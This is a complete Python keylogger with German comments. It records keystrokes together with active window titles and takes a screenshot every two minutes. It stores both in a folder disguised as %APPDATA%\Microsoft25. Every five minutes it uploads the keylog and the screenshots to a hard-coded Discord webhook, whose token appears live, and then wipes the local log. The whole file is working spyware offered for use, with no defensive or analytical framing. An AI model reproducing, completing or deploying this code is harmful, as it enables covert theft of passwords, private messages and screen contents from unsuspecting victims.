import os
import time
import threading
import logging
from datetime import datetime as dt
from pynput import keyboard
from PIL import ImageGrab
import requests

# Discord Webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1224136142958624819/AOMUAcdw3A6Wok1tBEY-l5fnoxALCmrfWfe3UqzPmFxRAcipHihJTi1FlBkBK9tK-yg8"

# Ordner für Logs/Screenshots
BASE_DIR = os.path.expandvars(r"%APPDATA%\Microsoft25")
os.makedirs(BASE_DIR, exist_ok=True)

# Logdatei Pfad
LOG_FILE = os.path.join(BASE_DIR, "keylog.txt")

# Logger konfigurieren
logging.basicConfig(
    filename=LOG_FILE,
    filemode='a',
    format='%(asctime)s | %(window)s | %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    level=logging.INFO
)

# Global aktuelle Fensterkennung speichern
current_window = None

def get_active_window_title():
    """Gibt den Titel des aktiven Fensters zurück (Windows)."""
    try:
        import ctypes
        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32
        pid = ctypes.c_ulong()
        hwnd = user32.GetForegroundWindow()
        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        length = user32.GetWindowTextLengthW(hwnd)
        buff = ctypes.create_unicode_buffer(length + 1)
        user32.GetWindowTextW(hwnd, buff, length + 1)
        return buff.value
    except Exception:
        return "Unbekanntes Fenster"

# Buffer für zusammengesetzte Zeichen (Wörter)
buffered_text = ""
buffer_lock = threading.Lock()

def flush_buffer(window_title):
    global buffered_text
    with buffer_lock:
        if buffered_text.strip():
            logging.info(buffered_text.strip(), extra={'window': window_title})
            buffered_text = ""

def on_press(key):
    global buffered_text, current_window

    window_title = get_active_window_title()
    if window_title != current_window:
        # Fensterwechsel protokollieren
        flush_buffer(current_window if current_window else "Start")
        current_window = window_title
        logging.info(f"[Fenster gewechselt zu: {window_title}]", extra={'window': window_title})

    try:
        if hasattr(key, 'char') and key.char is not None:
            # Normale Buchstaben anhängen
            with buffer_lock:
                buffered_text += key.char
        else:
            # Sonderzeichen flushen + loggen
            flush_buffer(window_title)
            logging.info(f"[Sondertaste: {key}]", extra={'window': window_title})
    except Exception as e:
        flush_buffer(window_title)
        logging.error(f"Fehler beim Loggen der Taste: {e}", extra={'window': window_title})

def uploader():
    """Sendet alle 5 Minuten die Logdatei zum Discord-Webhook hoch."""
    while True:
        time.sleep(300)  # alle 5 Minuten
        flush_buffer(current_window)
        if os.path.exists(LOG_FILE):
            try:
                with open(LOG_FILE, "rb") as f:
                    files = {"file": ("keylog.txt", f)}
                    r = requests.post(WEBHOOK_URL, files=files, data={"content": "Keylog Update"})
                    if r.ok:
                        # Logfile nach erfolgreichem Senden löschen
                        open(LOG_FILE, "w").close()
            except Exception as e:
                print(f"Upload Fehler: {e}")

def screenshotter():
    """Macht alle 2 Minuten einen Screenshot und sendet ihn."""
    while True:
        time.sleep(120)
        timestamp = dt.now().strftime("%Y%m%d_%H%M%S")
        screenshot_path = os.path.join(BASE_DIR, f"screenshot_{timestamp}.png")
        try:
            img = ImageGrab.grab()
            img.save(screenshot_path)
            with open(screenshot_path, "rb") as f:
                files = {"file": (f"screenshot_{timestamp}.png", f)}
                r = requests.post(WEBHOOK_URL, files=files, data={"content": f"Screenshot {timestamp}"})
            os.remove(screenshot_path)
        except Exception as e:
            print(f"Screenshot Fehler: {e}")

if __name__ == "__main__":
    print("Starte Keylogger...")

    # Starte Tastaturlistener
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    # Starte Screenshot-Thread
    threading.Thread(target=screenshotter, daemon=True).start()

    # Starte Upload-Thread
    threading.Thread(target=uploader, daemon=True).start()

    # Hauptthread schläft endlos (verhindert Script-Ende)
    while True:
        time.sleep(10)
